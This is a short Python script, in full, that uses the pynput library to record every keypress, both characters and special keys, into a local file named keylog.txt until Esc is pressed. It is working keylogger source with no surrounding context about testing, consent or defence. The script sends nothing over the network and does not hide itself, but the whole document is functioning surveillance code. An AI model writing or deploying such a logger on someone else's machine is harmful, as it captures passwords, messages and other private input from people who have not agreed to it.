from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)  # Logs normal characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")  # Logs special keys clearly

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the logger when Esc is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
